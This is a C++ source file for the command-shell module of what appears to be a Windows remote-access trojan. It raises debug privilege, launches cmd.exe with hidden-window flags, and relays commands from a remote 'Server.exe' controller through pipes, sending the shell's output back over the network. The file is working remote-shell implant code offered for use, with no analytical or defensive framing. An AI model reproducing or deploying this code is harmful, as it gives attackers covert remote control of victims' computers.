#include "pch.h"
#include "CmdManager.h"

CCmdManager::CCmdManager(CIocpClient* IocpClient) 
	:CManager(IocpClient)
{
	//回传数据包到服务
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	m_ClientReadHandle = NULL;       //Client
	m_ClientWriteHandle = NULL;       //Client
	m_CmdReadHandle = NULL;       //Cmd
	m_CmdWriteHandle = NULL;       //Cmd

	SECURITY_ATTRIBUTES  SecurityAttributes = { 0 };
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;     //重要   ----->继承关系      //创建子进程

	if (!CreatePipe(&m_ClientReadHandle, &m_CmdWriteHandle, &SecurityAttributes, 0))
	{
		if (m_ClientReadHandle != NULL)
		{
			CloseHandle(m_ClientReadHandle);
		}
		if (m_CmdWriteHandle != NULL)
		{
			CloseHandle(m_CmdWriteHandle);
		}
		return;
	}

	if (!CreatePipe(&m_CmdReadHandle, &m_ClientWriteHandle, &SecurityAttributes, 0))
	{
		if (m_ClientWriteHandle != NULL)
		{
			CloseHandle(m_ClientWriteHandle);
		}
		if (m_CmdReadHandle != NULL)
		{
			CloseHandle(m_CmdReadHandle);
		}
		return;
	}


	STARTUPINFO          StartupInfo = { 0 };
	PROCESS_INFORMATION  ProcessInfo = { 0 };
	//一定要初始化该成员
	StartupInfo.cb = sizeof(STARTUPINFO);


	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;   //隐藏

	StartupInfo.hStdInput = m_CmdReadHandle;                           //将管道数据向Cmd赋值
	StartupInfo.hStdOutput = StartupInfo.hStdError = m_CmdWriteHandle;
	//创建Cmd进程
	TCHAR  CmdFullPath[MAX_PATH] = { 0 };
	GetSystemDirectory(CmdFullPath, MAX_PATH);   //C:\windows\system32
												 //C:\windows\system32\cmd.exe
	_tcscat_s(CmdFullPath, _T("\\cmd.exe"));
	if (!CreateProcess(CmdFullPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		CloseHandle(m_ClientReadHandle);
		CloseHandle(m_ClientWriteHandle);
		CloseHandle(m_CmdReadHandle);
		CloseHandle(m_CmdWriteHandle);
		return;
	}
	m_CmdProcessHandle = ProcessInfo.hProcess;   //子进程的进程句柄
	m_CmdThreadHandle = ProcessInfo.hThread;     //子进程的主线程句柄


	BYTE	IsToken = CLIENT_CMD_MANAGER_REPLY;
	IocpClient->OnSending((char*)&IsToken, 1);

	m_IsLoop = TRUE;
	WaitingForDialogOpen();   //等待一个事件


	//创建读取管道中的数据的线程
	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReceiveProcedure, (LPVOID)this, 0, NULL);
}

CCmdManager::~CCmdManager()
{
	_tprintf(_T("~CCmdManager()\r\n"));
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);

	//退出线程
	m_IsLoop = FALSE;


	//杀死子进程
	TerminateThread(m_CmdThreadHandle, 0);     //结束我们自己创建的Cmd线程
	TerminateProcess(m_CmdProcessHandle, 0);   //结束我们自己创建的Cmd进程

	Sleep(100);

	if (m_ClientReadHandle != NULL)
	{
		DisconnectNamedPipe(m_ClientReadHandle);
		CloseHandle(m_ClientReadHandle);
		m_ClientReadHandle = NULL;
	}
	if (m_ClientWriteHandle != NULL)
	{
		DisconnectNamedPipe(m_ClientWriteHandle);
		CloseHandle(m_ClientWriteHandle);
		m_ClientWriteHandle = NULL;
	}
	if (m_CmdReadHandle != NULL)
	{
		DisconnectNamedPipe(m_CmdReadHandle);
		CloseHandle(m_CmdReadHandle);
		m_CmdReadHandle = NULL;
	}
	if (m_CmdWriteHandle != NULL)
	{
		DisconnectNamedPipe(m_CmdWriteHandle);
		CloseHandle(m_CmdWriteHandle);
		m_CmdWriteHandle = NULL;
	}
}

void CCmdManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
		case CLIENT_GO_ON:
		{
			NotifyDialogIsOpen();
			break;
		}
		default:
		{
			//接到有Server.exe发送过来的数据
			//将该数据写进管道
			unsigned long	ReturnLength = 0;
			if (WriteFile(m_ClientWriteHandle, BufferData, BufferLength, &ReturnLength, NULL))
			{

			}
			break;
		}
	}
}

DWORD __stdcall CCmdManager::ReceiveProcedure(LPVOID ParameterData)
{
	unsigned long   ReturnLength = 0;
	char	v1[0x400] = { 0 };    //0x200  0x1000   1M   64K
	DWORD	BufferLength = 0;
	CCmdManager* This = (CCmdManager*)ParameterData;

	while (This->m_IsLoop)
	{
		Sleep(100);
		//这里检测是否有数据  数据的大小是多少
		while (PeekNamedPipe(This->m_ClientReadHandle,     //不是阻塞
			v1, sizeof(v1), &ReturnLength, &BufferLength, NULL))
		{
			//如果没有数据就跳出本本次循环
			if (ReturnLength <= 0)
				break;
			memset(v1, 0, sizeof(v1));
			LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);
			//读取管道数据
			ReadFile(This->m_ClientReadHandle,
				BufferData, BufferLength, &ReturnLength, NULL);

			This->m_IocpClient->OnSending((char*)BufferData, ReturnLength);

			LocalFree(BufferData);

		}
	}
	_tprintf(_T("CCmdManager::ReceiveProcedure() 退出\r\n"));
	return 0;
}
